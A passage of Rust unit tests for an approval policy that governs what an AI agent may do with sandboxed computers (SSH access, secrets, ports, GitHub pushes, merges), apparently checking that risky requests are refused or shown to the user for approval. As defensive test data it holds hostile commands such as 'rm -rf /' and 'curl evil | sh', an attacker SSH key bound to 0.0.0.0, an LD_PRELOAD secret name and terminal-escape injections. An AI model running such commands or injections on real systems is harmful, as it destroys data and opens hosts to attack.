            name: name.into(),
            id: id.map(str::to_owned),
            source: Some("main".into()),
            job_id: None,
            at: 0,
        };
        store.begin("main", pending("ok", None)).unwrap();
        store.begin("main", pending("bad", None)).unwrap();
        store.begin("main", pending("known", Some("id-known"))).unwrap();
        assert!(store.begin("main", pending("ok", None)).is_err());
        store.attach_job("main", "ok", "job:1").unwrap();
        store.attach_job("main", "bad", "job:2").unwrap();
        store.attach_job("main", "known", "job:3").unwrap();
        let settled = store
            .settle(
                &|job| match job {
                    "job:2" => JobState::Failed,
                    _ => JobState::Succeeded,
                },
                &|pending| {
                    pending
                        .id
                        .clone()
                        .or_else(|| (pending.name == "ok").then(|| "id-ok".to_owned()))
                },
            )
            .unwrap();
        assert!(settled.pending.is_empty());
        assert_eq!(
            settled.made_by("main"),
            ["id-ok".to_owned(), "id-known".to_owned()].into()
        );
    }

    #[test]
    fn a_removed_computer_hands_what_it_made_to_its_maker_and_jobs_are_kept_per_caller() {
        let directory = tempfile::tempdir().unwrap();
        let store = PolicyStore::new(directory.path());
        store
            .import_legacy("main", &["a".into()], &[("job:1".into(), 5)])
            .unwrap();
        store.import_legacy("a", &["b".into()], &[]).unwrap();
        store.note_job("a", "job:2").unwrap();
        let document = store.snapshot().unwrap();
        assert!(document.owns_job("main", "job:1") && !document.owns_job("a", "job:1"));
        store.remove_computers(&["a"]).unwrap();
        let document = store.snapshot().unwrap();
        assert_eq!(document.made_by("main"), ["b".to_owned()].into());
        assert!(document.jobs_of("a").is_empty());
        store.drop_job("main", "job:1").unwrap();
        assert!(store.snapshot().unwrap().jobs.is_empty());
        store.remove_computers(&["main"]).unwrap();
    }
}

#[test]
fn turning_ssh_access_off_passes_only_the_computer_the_switch_and_what_is_saved() {
    let hostile = json!({"computerId": "fork-1", "enabled": false, "port": 22,
        "bindAddress": "0.0.0.0", "keys": ["ssh-ed25519 AAAA attacker"], "deviceId": "local"});
    assert_eq!(
        params_of(check("sshAccess.save", hostile)),
        json!({"computerId": "fork-1", "enabled": false, "port": 2200, "bindAddress": "127.0.0.1"})
    );
    assert!(refused(&check(
        "sshAccess.save",
        json!({"computerId": "stranger", "enabled": false, "port": 22, "bindAddress": "x"})
    )));
}

#[test]
fn preparing_a_computer_for_ssh_is_the_owners() {
    assert!(refused(&check("guest.prepare", json!({"computerId": "fork-1"}))));
    assert!(refused(&check("guest.prepare", json!({"computerId": "main"}))));
}

#[test]
fn a_checkpoint_of_its_own_computer_is_manual_and_never_trims_anything() {
    let own = params_of(check(
        "checkpoints.create",
        json!({"computerId": "main", "name": "x", "kind": "step", "keepNewest": 1}),
    ));
    assert_eq!(own, json!({"computerId": "main", "name": "x", "kind": "manual"}));
    let plain = params_of(check("checkpoints.create", json!({"computerId": "main", "name": "x"})));
    assert_eq!(plain["kind"], "manual");
    // A computer it made is the caller's to manage: the parameters pass through.
    let made = json!({"computerId": "fork-1", "name": "x", "kind": "step", "keepNewest": 3});
    assert_eq!(params_of(check("checkpoints.create", made.clone())), made);
}

fn linux_create(sizes: Value) -> Value {
    let mut configuration = json!({"id": "x", "name": "box", "cpus": 2, "maxCPUs": 4,
        "memoryGiB": 4, "maxMemoryGiB": 8, "workspaceStorageGiB": 20, "runtimeStorageGiB": 10});
    for (key, value) in sizes.as_object().into_iter().flatten() {
        configuration[key] = value.clone();
    }
    json!({"kind": "linux", "configuration": configuration})
}

#[test]
fn a_new_computer_larger_than_its_maker_asks_with_the_sizes() {
    assert!(allowed(&check("computers.create", linux_create(json!({})))));
    assert!(allowed(&check("computers.create", linux_create(json!({"cpus": 1, "memoryGiB": 1})))));
    for (field, value) in [
        ("cpus", 3),
        ("maxCPUs", 5),
        ("memoryGiB", 5),
        ("maxMemoryGiB", 9),
        ("workspaceStorageGiB", 21),
        ("runtimeStorageGiB", 11),
    ] {
        match check("computers.create", linux_create(json!({ field: value }))) {
            Decision::Ask { kind, summary, .. } => {
                assert_eq!(kind, ApprovalKind::Resources, "{field}");
                assert!(summary.contains(&value.to_string()), "{field}: {summary}");
                assert!(summary.contains("box"), "{summary}");
            }
            other => panic!("{field}: {other:?}"),
        }
    }
    // A container that is also larger says so, and is asked as a container.
    let mut container = linux_create(json!({"cpus": 8}));
    container["configuration"]["runtime"] = json!("container");
    match check("computers.create", container) {
        Decision::Ask { kind, summary, .. } => {
            assert_eq!(kind, ApprovalKind::Container);
            assert!(summary.contains("8 CPUs") && summary.contains("more than"), "{summary}");
        }
        other => panic!("{other:?}"),
    }
    // A computer whose own sizes are unknown asks for anything.
    assert_eq!(
        asked(&as_computer("stranger", "computers.create", linux_create(json!({})))),
        Some(ApprovalKind::Resources)
    );
    let macos = |cpus: u64, disk: u64| {
        json!({"kind": "macos", "request": {"name": "mac", "cpus": cpus,
            "memoryGiB": 4, "diskGiB": disk}})
    };
    assert!(allowed(&check("computers.create", macos(2, 30))));
    assert_eq!(asked(&check("computers.create", macos(3, 30))), Some(ApprovalKind::Resources));
    assert_eq!(asked(&check("computers.create", macos(2, 31))), Some(ApprovalKind::Resources));
}

#[test]
fn only_the_desktop_choice_that_is_safe_reaches_a_new_computer() {
    let mut create = linux_create(json!({}));
    create["configuration"]["desktop"] = json!({"startWithComputer": false, "builtIn": true});
    let granted = params_of(check("computers.create", create.clone()));
    assert_eq!(granted["configuration"]["desktop"], json!({"startWithComputer": false}));
    create["configuration"]["desktop"] = json!({"startWithComputer": "yes"});
    assert!(refused(&check("computers.create", create.clone())));
    create["configuration"]["desktop"] = json!("on");
    assert!(refused(&check("computers.create", create.clone())));
    create["configuration"]["desktop"] = Value::Null;
    let granted = params_of(check("computers.create", create));
    assert!(granted["configuration"].get("desktop").is_none());
}

fn ask_summary(name: &str, params: Value) -> String {
    summary_of(check(name, params))
}

#[test]
fn a_github_configuration_says_what_each_computer_had_and_would_have() {
    let save = |policy: Value| {
        json!({"configuration": {"computers": [policy,
            {"computerId": "stranger", "repositoryMode": "all"}]}})
    };
    let summary = ask_summary(
        "github.configuration.save",
        save(json!({"computerId": "main", "repositoryMode": "selected",
            "repositories": [{"repository": "me/app", "allowPushes": true},
                {"repository": "me/lib", "allowPushes": false}],
            "identity": {"name": "Agent", "email": "a@example.com", "apply": true}})),
    );
    assert!(summary.starts_with("GitHub write access:"), "{summary}");
    assert!(summary.contains("“main-name” goes from no access to repositories"), "{summary}");
    assert!(summary.contains("“me/app” (can write)"), "{summary}");
    assert!(summary.contains("“me/lib” (read only)"), "{summary}");
    assert!(summary.contains("commits as “Agent” “a@example.com”"), "{summary}");
    let all = ask_summary(
        "github.configuration.save",
        save(json!({"computerId": "main", "repositoryMode": "all",
            "allRepositoriesAllowChanges": false})),
    );
    assert!(all.contains("from no access to all repositories, read only"), "{all}");
    // A long list is counted, not dropped.
    let many: Vec<Value> = (0..9)
        .map(|n| json!({"repository": format!("me/r{n}"), "allowPushes": n >= 7}))
        .collect();
    let long = ask_summary(
        "github.configuration.save",
        save(json!({"computerId": "main", "repositoryMode": "selected", "repositories": many})),
    );
    assert!(long.contains("and 4 more, 2 of them with writing"), "{long}");
    assert!(!long.contains("me/r8"), "{long}");
}

#[test]
fn what_the_agent_chose_is_quoted_cut_and_never_the_start_of_the_sentence() {
    let long = "x".repeat(300);
    let container = |name: &str| {
        json!({"kind": "linux", "configuration": {"name": name, "runtime": "container",
            "cpus": 1, "maxCPUs": 1, "memoryGiB": 1, "maxMemoryGiB": 1,
            "workspaceStorageGiB": 1, "runtimeStorageGiB": 1}})
    };
    let summary = ask_summary("computers.create", container("box"));
    assert!(summary.starts_with("Less isolated: make “box”"), "{summary}");
    // A Linux name is held to the runtime's rule; other names to plain text.
    assert!(refused(&check("computers.create", container("Bad Name\u{1b}[31m"))));
    assert!(refused(&check("computers.create", container(&long))));
    let fork = |name: &str| json!({"computerId": "main", "newName": name, "secrets": ["prod-db"]});
    assert!(summary_of(check("checkpoints.fork", fork("copy"))).starts_with("More access than"));
    assert!(refused(&check("checkpoints.fork", fork("a\u{202E}b"))));
    assert!(refused(&check("checkpoints.fork", fork(&long))));
    // A secret's name and hosts are held to the real rules, and hosts are quoted and counted.
    let secret = |name: &str, domains: Value| {
        json!({"request": {"operation": "add", "name": name, "value": "v",
            "computerIds": ["fork-1"], "allowedDomains": domains}})
    };
    assert!(refused(&check("secrets.save", secret("bad name", json!(["a.example.com"])))));
    assert!(refused(&check("secrets.save", secret("LD_PRELOAD", json!(["a.example.com"])))));
    assert!(refused(&check("secrets.save", secret("ok", json!(["Not A Host"])))));
    assert!(refused(&check("secrets.save", secret("ok", json!([])))));
    assert!(refused(&check("secrets.save", secret("ok", json!(["*"])))));
    let hosts: Vec<String> = (0..8).map(|n| format!("h{n}.example.com")).collect();
    let summary = ask_summary("secrets.save", secret("API_KEY", json!(hosts)));
    assert!(
        summary.starts_with("Sent only to “h0.example.com”"),
        "{summary}"
    );
    assert!(summary.contains("and 3 more"), "{summary}");
    // The secret's hosts also become reachable from a computer that has a list of hosts.
    let summary = ask_summary("secrets.save", secret("API_KEY", json!(["api.example.com"])));
    assert!(
        summary.ends_with("A computer whose network is a list of allowed hosts can also reach “api.example.com” because of it."),
        "{summary}"
    );
    let summary = ask_summary("secrets.save", secret("API_KEY", json!(["*.co.uk", "api.example.com"])));
    assert!(summary.contains("not added to a list of allowed hosts"), "{summary}");
    let any = json!({"request": {"operation": "add", "name": "API_KEY", "value": "v",
        "computerIds": ["fork-1"], "allowedDomains": ["*"], "allowAnyDestination": true}});
    assert!(ask_summary("secrets.save", any).starts_with("Sent to any destination: add the secret “API_KEY”"));
    // A value that cannot be saved is refused now.
    let no_value = json!({"request": {"operation": "add", "name": "API_KEY",
        "computerIds": ["fork-1"], "allowedDomains": ["a.example.com"]}});
    assert!(refused(&check("secrets.save", no_value)));
    // Control characters in an agent's text do not reach the summary.
    let world = World::default();
    let named = Judge::new("main", &world).shown("x");
    assert_eq!(named, "“x-name”");
    assert_eq!(summary::quoted("a\u{1b}[31mb\u{202E}\"c\n"), "“ab'c ”");
    assert_eq!(summary::quoted(&long).chars().count(), 82);
}

#[test]
fn a_port_summary_states_the_scheme_and_leaves_the_device_port_to_the_engine() {
    let params = json!({"computerId": "fork-1", "port": 80, "hostPort": 5432, "scheme": "https"});
    match check("network.publish", params) {
        Decision::Ask { summary, params, .. } => {
            assert!(summary.starts_with("Opens a port on this device: publish port 80 of “fork-1-name”"), "{summary}");
            assert!(summary.contains("website over https"), "{summary}");
            assert!(summary.contains("device port Silo chooses"), "{summary}");
            assert_eq!(
                params.unwrap(),
                json!({"computerId": "fork-1", "port": 80, "scheme": "https"})
            );
        }
        other => panic!("{other:?}"),
    }
    let plain = ask_summary("network.publish", json!({"computerId": "fork-1", "port": 22}));
    assert!(plain.contains("as a plain port"), "{plain}");
    assert!(refused(&check("network.publish", json!({"computerId": "fork-1", "port": 0}))));
    assert!(refused(&check(
        "network.publish",
        json!({"computerId": "fork-1", "port": 80, "scheme": "ftp"})
    )));
}

#[test]
fn an_ssh_summary_states_the_address_and_any_key_the_agent_chose() {
    let enable = |extra: Value| {
        let mut params = json!({"computerId": "main", "enabled": true, "port": 2300});
        for (key, value) in extra.as_object().unwrap() {
            params[key] = value.clone();
        }
        params
    };
    // Nothing changes: the saved address and keys stay, and the call says so.
    match check("sshAccess.save", enable(json!({}))) {
        Decision::Ask { summary, params, .. } => {
            assert!(summary.starts_with("Opens SSH into “main-name” on port 2300, reachable only from this device"), "{summary}");
            assert!(summary.contains("keys already saved"), "{summary}");
            let params = params.unwrap();
            assert_eq!(params["bindAddress"], "127.0.0.1");
            assert!(params.get("keys").is_none());
        }
        other => panic!("{other:?}"),
    }
    // An address on the network is called what it is.
    let network = ask_summary("sshAccess.save", enable(json!({"bindAddress": "192.168.1.20"})));
    assert!(network.contains("reachable from the network at 192.168.1.20"), "{network}");
    assert!(refused(&check("sshAccess.save", enable(json!({"bindAddress": "0.0.0.0"})))));
    assert!(refused(&check("sshAccess.save", enable(json!({"bindAddress": "localhost"})))));
    // A key the agent chose is authorised, with its fingerprint; a saved one is not new.
    let new_key = ed25519_key(9);
    let fingerprint = crate::ssh_access::key_fingerprint(&new_key).unwrap();
    let with_keys = ask_summary(
        "sshAccess.save",
        enable(json!({"keys": [ed25519_key(1), new_key]})),
    );
    assert!(with_keys.starts_with("Authorises a key chosen by the agent"), "{with_keys}");
    assert!(with_keys.contains(&fingerprint), "{with_keys}");
    assert!(!with_keys.contains(&crate::ssh_access::key_fingerprint(&ed25519_key(1)).unwrap()));
    assert!(refused(&check("sshAccess.save", enable(json!({"keys": ["not a key"]})))));
    // Turning it off still keeps the saved settings.
    match check("sshAccess.save", json!({"computerId": "main", "enabled": false, "port": 1,
        "bindAddress": "10.0.0.9", "keys": [ed25519_key(7)]})) {
        Decision::Allow(allowed) => {
            let params = allowed.params.unwrap();
            assert_eq!(params["port"], 2200);
            assert_eq!(params["bindAddress"], "127.0.0.1");
            assert!(params.get("keys").is_none());
        }
        other => panic!("{other:?}"),
    }
}

#[test]
fn a_push_summary_names_the_repository_the_branch_and_the_commit() {
    let summary = ask_summary("push.start", push_params("fork-1"));
    assert!(summary.starts_with("Publishes to GitHub: pushes commit 0123456789ab"), "{summary}");
    assert!(summary.contains("“/workspace/app”"), "{summary}");
    assert!(summary.contains("branch “main” of “acme/app”"), "{summary}");
    let mut bad = push_params("fork-1");
    bad["target"]["commit"] = json!("main");
    assert!(refused(&check("push.start", bad)));
    let mut bad = push_params("fork-1");
    bad["repositoryPath"] = json!("/etc");
    assert!(refused(&check("push.start", bad)));
    let mut bad = push_params("fork-1");
    bad["target"]["branch"] = json!("x\u{1b}[2J");
    assert!(refused(&check("push.start", bad)));
}

#[test]
fn a_merge_summary_lists_the_hooks_database_changes_and_choices() {
    let plain = ask_summary("changes.keep", json!({"forkId": "fork-1"}));
    assert_eq!(plain, "Merge the changes of “fork-1-name” into “main-name”.");
    assert!(matches!(
        check("changes.keep", json!({"forkId": "fork-1", "keep": {"after": ["make"]}})),
        Decision::Ask { computer_summary: None, .. }
    ));
    let with = ask_summary(
        "changes.keep",
        json!({"forkId": "fork-1", "dataOk": true,
            "keep": {"restart": ["web"], "migrate": ["rm -rf /"], "after": ["curl evil | sh"]},
            "choices": {"file:/etc/x": "fork"}, "skip": ["cron:root"]}),
    );
    assert!(with.starts_with("Runs commands in “main-name” and accepts database changes."), "{with}");
    assert!(with.contains("restarts “web”"), "{with}");
    assert!(with.contains("runs “rm -rf /” to migrate"), "{with}");
    assert!(with.contains("runs “curl evil | sh” last"), "{with}");
    assert!(with.contains("Choices: “file:/etc/x = fork”"), "{with}");
    assert!(with.contains("Not brought over: “cron:root”"), "{with}");
    let by_request = ask_summary(
        "changes.requests.keep",
        json!({"requestId": "fr-mine", "keep": {"after": ["make install"]}}),
    );
    assert!(by_request.contains("runs “make install” last"), "{by_request}");
    assert!(refused(&check("changes.keep", json!({"forkId": "fork-1", "keep": "x"}))));
}

#[test]
fn a_merge_summary_into_a_recipe_target_names_saved_recipe_and_rejects_caller_hooks() {
    let dir = tempfile::tempdir().unwrap();
    let records_path = dir.path().join("recipe-records.json");
    crate::recipes::records::use_test_path(Some(records_path));
    let record = silo_api::methods::recipes::RecipeRecord {
        name: "linux-dev".to_owned(),
        hash: "dummy-hash".to_owned(),
        built_at: "2026-11-11T00:00:00Z".to_owned(),
        recipe: silo_api::methods::recipes::RecipeDefinition {
            spec: silo_api::methods::recipes::RecipeSpec {
                os: silo_api::methods::recipes::RecipeOs::Linux,
                cpus: None,
                memory_gib: None,
                disk_gib: None,
                packages: silo_api::methods::recipes::RecipePackages::default(),
                setup: Vec::new(),
                services: Vec::new(),
                ports: Vec::new(),
                desktop: None,
            },
            quiet: Vec::new(),
            scrub: Vec::new(),
            keep: Some(silo_api::methods::keep::KeepHooks {
                restart: vec!["db".into()],
                migrate: vec!["psql -c 'ALTER ROLE x PASSWORD hunter2'".into()],
                after: vec!["cargo test".into()],
            }),
            test: None,
            files: Vec::new(),
            commands_hidden: None,
        },
    };
    crate::recipes::records::set("main", &record).unwrap();

    assert!(refused(&check(
        "changes.keep",
        json!({"forkId": "fork-1", "keep": {"restart": ["web"]}})
    )));

    let summary = ask_summary("changes.keep", json!({"forkId": "fork-1"}));
    assert!(summary.contains("In “main-name” it restarts “db”; runs “psql -c 'ALTER ROLE x PASSWORD hunter2'” to migrate; runs “cargo test” last."), "{summary}");
    assert!(summary.contains("The saved recipe “linux-dev” will get the merged packages and files."), "{summary}");
    // The computer that asks reads how many steps run, not the commands.
    let Decision::Ask { computer_summary: Some(shown), .. } =
        check("changes.keep", json!({"forkId": "fork-1"}))
    else {
        panic!("no computer summary")
    };
    assert!(shown.contains("In “main-name” it restarts “db”; runs 1 step to migrate; runs 1 step last."), "{shown}");
    assert!(!shown.contains("hunter2") && !shown.contains("cargo test"), "{shown}");

    let by_request = ask_summary("changes.requests.keep", json!({"requestId": "fr-mine"}));
    assert!(by_request.contains("runs “cargo test” last."), "{by_request}");
    let Decision::Ask { computer_summary: Some(shown), .. } =
        check("changes.requests.keep", json!({"requestId": "fr-mine"}))
    else {
        panic!("no computer summary")
    };
    assert!(!shown.contains("hunter2") && !shown.contains("cargo test"), "{shown}");
    assert!(by_request.contains("The saved recipe “linux-dev” will get the merged packages and files."), "{by_request}");

    crate::recipes::records::use_test_path(None);
}
